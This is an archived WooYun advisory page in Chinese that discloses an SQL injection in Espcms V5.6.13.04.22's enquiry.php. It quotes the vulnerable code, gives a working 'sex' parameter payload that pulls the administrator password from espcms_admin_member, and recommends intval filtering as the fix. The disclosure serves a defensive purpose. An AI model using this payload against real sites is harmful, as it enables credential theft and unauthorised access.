@@ -1,0 +1,198 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		Espcms V5.6.13.04.22 UTF8 正式版注入漏洞之4/N  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		Espcms V5.6.13.04.22 UTF8 正式版注入漏洞之4/N  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/Code_Sec">Code_Sec</a> 
+</li><li>提交时间：		2013-05-14 19:31</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-05-14：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-05-14：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-05-17：	细节向第三方安全合作伙伴开放<br/>
+									2013-05-24：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-06-03：	细节向普通白帽子公开<br/>
+									2013-06-23：	细节向实习白帽子公开<br/>
+									2013-08-12：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">Espcms V5.6.13.04.22 UTF8 正式版某文件存在注入漏洞，可获取管理员帐号和密码</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">在文件\interface\enquiry.php:<br />
+<br />
+</p><pre><code>function in_enquirysave() {<br />
+		parent::start_pagetemplate();<br />
+<br />
+		$this-&gt;fun-&gt;formpathver();<br />
+		$lng = (admin_LNG == &#039;big5&#039;) ? $this-&gt;CON[&#039;is_lancode&#039;] : admin_LNG;<br />
+		if ($this-&gt;CON[&#039;is_enquiry_memclass&#039;]) {<br />
+			parent::member_purview(0, $this-&gt;get_link(&#039;enquiry&#039;, array(), admin_LNG));<br />
+		}<br />
+		$cartid = $this-&gt;fun-&gt;eccode($this-&gt;fun-&gt;accept(&#039;ecisp_enquiry_list&#039;, &#039;C&#039;), &#039;DECODE&#039;, db_pscode);<br />
+		$cartid = stripslashes(htmlspecialchars_decode($cartid));<br />
+		$uncartid = !empty($cartid) ? unserialize($cartid) : 0;<br />
+<br />
+		$userid = intval($this-&gt;fun-&gt;accept(&#039;userid&#039;, &#039;P&#039;));<br />
+		$userid = !empty($userid) ? $userid : 0;<br />
+		$linkman = trim($this-&gt;fun-&gt;accept(&#039;linkman&#039;, &#039;P&#039;, true, true));<br />
+		$email = $this-&gt;fun-&gt;accept(&#039;email&#039;, &#039;P&#039;);<br />
+		$sex = $this-&gt;fun-&gt;accept(&#039;sex&#039;, &#039;P&#039;);<br />
+		$sex = empty($sex) ? 0 : $sex;</code></pre><p class='detail'><br />
+<br />
+$sex变量没有使用intval过滤，进入后面的sql中也没有被包含在单引号内<br />
+<br />
+</p><pre><code>$db_field = &#039;enquirysn,userid,linkman,sex,country,province,city,district,address,zipcode,tel,fax,mobile,email,content,isclass,addtime,edittime&#039;;<br />
+		$db_values = &quot;&#039;$enquirysn&#039;,$userid,&#039;$linkman&#039;,$sex,$country,$province,$city,$district,&#039;$address&#039;,&#039;$zipcode&#039;,&#039;$tel&#039;,&#039;$fax&#039;,&#039;$mobile&#039;,&#039;$email&#039;,&#039;$content&#039;,0,$addtime,0&quot;;<br />
+		$this-&gt;db-&gt;query(&#039;INSERT INTO &#039; . $db_table . &#039; (&#039; . $db_field . &#039;) VALUES (&#039; . $db_values . &#039;)&#039;);</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+修改sex值为下面：<br />
+<br />
+sex=0,0,0,0,0,1,0,13800000000,0,13800000000,(select password from espcms_admin_member limit 1),0,0,1368528987,0)%23 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">把管理员的密码插入到邮件地址中：<br />
+<br />
+</p><p class="detail"><a href="../images/141923546ea0af8cf28bf3d696156902c9e4d54e.jpg" target="_blank"><img src="../images/141923546ea0af8cf28bf3d696156902c9e4d54e.jpg" alt="f.jpg" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">intval过滤 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/Code_Sec" title="Code_Sec">Code_Sec</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-023737" title="Espcms V5.6.13.04.22 UTF8 正式版注入漏洞之4/N">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：10 </p>
+													<p class="detail">确认时间：2013-05-14 21:37</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢提供此漏洞！！！</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="23737";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
